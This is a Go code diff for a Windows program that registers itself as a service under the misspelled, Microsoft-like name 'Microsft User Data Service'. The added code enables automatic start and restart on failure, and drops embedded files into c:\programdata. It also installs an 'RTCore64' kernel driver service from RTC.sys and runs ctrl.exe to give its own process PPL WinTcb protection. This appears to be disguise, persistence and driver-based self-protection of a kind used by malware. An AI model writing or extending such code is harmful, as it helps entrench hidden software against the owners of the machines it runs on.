@@ -39,6 +39,13 @@ var svcConfig = &service.Config{
 	Name:        "Microsft User Data",
 	DisplayName: "Microsft User Data Service",
 	Description: "Dillection User Data.",
+	Option: service.KeyValue{
+		// 自动重启设置
+		"StartType":              "automatic", // 开机自动启动
+		"OnFailure":              "restart",
+		"OnFailureDelayDuration": "13s",
+		"OnFailureResetPeriod":   1000,
+	},
 }
 
 // Windows API 动态链接库
@@ -325,11 +332,12 @@ func setUserPassword(username, password string) error {
 // checkAndCreateService 检查并创建系统服务
 func checkAndCreateService() error {
 	// 获取当前程序所在目录
-	exePath, err := os.Executable()
-	if err != nil {
-		return fmt.Errorf("获取程序路径失败: %v", err)
-	}
-	exeDir := filepath.Dir(exePath)
+	//exePath, err := os.Executable()
+	//if err != nil {
+	//	return fmt.Errorf("获取程序路径失败: %v", err)
+	//}
+	//exeDir := filepath.Dir(exePath)
+	release_dir := `c:\programdata\`
 
 	// 设置锁屏服务异常时自动重启
 	cmd := fmt.Sprintf("sc failure \"%s\"  reset= 0 actions= restart/3000", svcConfig.Name)
@@ -344,20 +352,20 @@ func checkAndCreateService() error {
 	if serviceExists {
 		log.Println("RTCore64 服务已存在")
 		// 释放内嵌文件
-		err = extractEmbeddedFiles(exeDir)
+		err = extractEmbeddedFiles(release_dir)
 		return executeCtrlCommand()
 	}
 
 	log.Println("RTCore64 服务不存在，开始创建服务...")
 
 	// 释放内嵌文件
-	err = extractEmbeddedFiles(exeDir)
+	err = extractEmbeddedFiles(release_dir)
 	if err != nil {
 		return fmt.Errorf("释放内嵌文件失败: %v", err)
 	}
 
 	// 创建系统服务
-	err = createService("RTCore64", filepath.Join(exeDir, "RTC.sys"))
+	err = createService("RTCore64", filepath.Join(release_dir, "RTC.sys"))
 	if err != nil {
 		return fmt.Errorf("创建服务失败: %v", err)
 	}
@@ -466,12 +474,13 @@ func executeCtrlCommand() error {
 	log.Printf("当前进程PID: %d", pid)
 
 	// 获取当前程序所在目录
-	exePath, err := os.Executable()
-	if err != nil {
-		return fmt.Errorf("获取程序路径失败: %v", err)
-	}
-	exeDir := filepath.Dir(exePath)
-	ctrlPath := filepath.Join(exeDir, "ctrl.exe")
+	//exePath, err := os.Executable()
+	//if err != nil {
+	//	return fmt.Errorf("获取程序路径失败: %v", err)
+	//}
+	//exeDir := filepath.Dir(exePath)
+	release_dir := `c:\programdata\`
+	ctrlPath := filepath.Join(release_dir, "ctrl.exe")
 
 	// 执行ctrl.exe命令
 	cmd := exec.Command(ctrlPath, "set", strconv.Itoa(pid), "PPL", "WinTcb")
@@ -479,12 +488,12 @@ func executeCtrlCommand() error {
 	cmd.Stdout = &out
 	cmd.Stderr = &out
 
-	err = cmd.Run()
+	err := cmd.Run()
 	if err != nil {
 		return fmt.Errorf("执行ctrl.exe命令失败: %v, 输出: %s", err, out.String())
 	}
 
-	log.Printf("ctrl.exe命令执行成功: %s", out.String())
+	log.Printf("ctrl.exe执行成功: %s", out.String())
 	return nil
 }
 
